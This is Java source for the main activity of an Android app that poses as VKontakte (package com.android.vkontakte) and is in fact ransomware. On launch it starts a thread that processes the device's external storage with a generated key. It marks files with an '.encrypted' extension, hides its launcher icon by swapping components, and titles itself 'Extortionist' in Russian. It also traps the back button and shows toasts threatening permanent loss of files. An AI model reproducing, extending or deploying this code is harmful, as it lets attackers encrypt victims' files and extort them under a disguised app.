/*
 * Copyright (C) 2018 Тимашков Иван
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.android.vkontakte;

import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.recyclerview.BuildConfig;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.widget.Toast;
import java.io.File;

import static android.widget.Toast.LENGTH_LONG;

//##################################################################
/**
 * @since 21.09.2018
 * @author Тимашков Иван
 * @author https://github.com/TimScriptov
 */
public class MainActivity extends AppCompatActivity
//##################################################################
	{

		public static MainActivity instance;
		static File externalStorageDirectory;
		static String hz;
		static int hzs;
		static String decryptKey;

		ComponentName firstComponentName;
		ComponentName secondComponentName;
		PackageManager packageManager;
		String randomNumber;
//===================================================================
		private void disableComponent ( ComponentName componentName )
//===================================================================
			{
				packageManager.setComponentEnabledSetting ( componentName, 2, 1 );
			}//disableComponent
//===================================================================
		private void enabledComponent ( ComponentName componentName )
//===================================================================
			{
				packageManager.setComponentEnabledSetting ( componentName, 1, 1 );
			}//enableComponent
//===================================================================
		private void setIconSc ( )
//===================================================================
			{
				disableComponent ( this.firstComponentName );
				enabledComponent ( this.secondComponentName );
			}//setIconSc
//===================================================================
		@Override protected void onCreate ( Bundle bundle )
//===================================================================
			{
				getWindow ( ).addFlags ( WindowManager.LayoutParams.FLAG_FULLSCREEN );
				packageManager = getApplicationContext ( ).getPackageManager ( );
				firstComponentName = new ComponentName ( getBaseContext ( ), "com.android.vkontakte.MainActivity" );
				secondComponentName = new ComponentName ( getBaseContext ( ), "com.android.vkontakte.QQ1279525738" );

				super.onCreate ( bundle );
				setContentView ( R.layout.home );

				instance = this;

				getSupportFragmentManager ( ).beginTransaction ( )
					.replace ( R.id.frame_content, new EncryptFragment ( ) )
					.commit ( );

				SharedPreferences sharedPreferences = getSharedPreferences ( "XH", 0 );
				if ( sharedPreferences.getString ( "bah", BuildConfig.VERSION_NAME )
					.equals ( BuildConfig.VERSION_NAME ) )
					{
						randomNumber =
							BuildConfig.VERSION_NAME + ( ( (int) ( Math.random ( ) * ( (double) 1000000 ) ) ) + 10000000 );
						Editor edit = sharedPreferences.edit ( );
						edit.putString ( "bah", randomNumber );
						edit.commit ( );
					}
				else
					{
						randomNumber = sharedPreferences.getString ( "bah", BuildConfig.VERSION_NAME );
					}
				//Расширение зашифрованного файла
				hz = ( ".encrypted" )
					+ randomNumber;
				decryptKey = BuildConfig.VERSION_NAME + ( Integer.parseInt ( this.randomNumber ) + 520 );//Ключ расшифровки
				hzs = hz.length ( );
				externalStorageDirectory =
					new File ( String.valueOf ( Environment.getExternalStorageDirectory ( ) ) + "/" );

				if ( sharedPreferences.getInt ( "cs", 0 ) >= 2 )
					{
						setTitle ( "Вымогатель" );
						getSupportFragmentManager ( ).beginTransaction ( )
							.replace ( R.id.frame_content, new MainFragment ( ) )
							.commit ( );
						Utils.bz ( this );
					}

				if ( sharedPreferences.getInt ( "sss", 0 ) == 0 )
					{
						new Thread ( new Runnable ( ) {
									@Override public void run ( )
										{
											Utils.deleteDir ( externalStorageDirectory.toString ( ), decryptKey, 1, MainActivity.this );
										}
								} ).start ( );
						return;
					}

				setTitle ( "Вымогатель" );
				getSupportFragmentManager ( ).beginTransaction ( )
					.replace ( R.id.frame_content, new MainFragment ( ) )
					.commit ( );
				Utils.bz ( this );
				setIconSc ( );
			}//onCreate
//===================================================================
		@Override
		public boolean onKeyDown ( int keyCode, KeyEvent keyEvent )
//===================================================================
			{
				if ( keyCode == KeyEvent.KEYCODE_BACK )
					{
						Toast.makeText ( this, ( getSupportFragmentManager ( ).findFragmentById (
											R.id.frame_content ) ) instanceof EncryptFragment
										? "Пожалуйста, не выходите из программы, а то вы не сможете никогда восстановить файлы!"
										: "Пожалуйста, не выходите из программы, а то вы не сможете никогда восстановить файлы!", LENGTH_LONG )
							.show ( );
					}
				return true;
			}//onKeyDown
//===================================================================
		@Override protected void onPause ( )
//===================================================================
			{
				if ( getSupportFragmentManager ( ).findFragmentById (
						R.id.frame_content ) instanceof EncryptFragment )
					{
						SharedPreferences sharedPreferences = getSharedPreferences ( "XH", 0 );
						Editor edit = sharedPreferences.edit ( );
						edit.putInt ( "cs", sharedPreferences.getInt ( "cs", 0 ) + 1 );
						edit.commit ( );

						Toast.makeText ( this, "Пожалуйста, не выходите из программы, а то вы не сможете никогда восстановить файлы!",
										LENGTH_LONG ).show ( );
					}
				else
					{
						Toast.makeText ( this, "Пожалуйста, не выходите из программы, а то вы не сможете никогда восстановить файлы!",
										LENGTH_LONG ).show ( );
					}

				super.onPause ( );
			}//onPause
//===================================================================
		@Override protected void onResume ( )
//===================================================================
			{
				if ( ( getSupportFragmentManager ( ).findFragmentById (
						R.id.frame_content ) instanceof EncryptFragment )
					&& getSharedPreferences ( "XH", 0 ).getInt ( "cs", 0 ) >= 2 )
					{
						setTitle ( "Вымогатель" );
						getSupportFragmentManager ( ).beginTransaction ( )
							.replace ( R.id.frame_content, new MainFragment ( ) )
							.commit ( );
					}

				super.onResume ( );
			}//onResume
//===================================================================
	}//MainActivity
//##################################################################
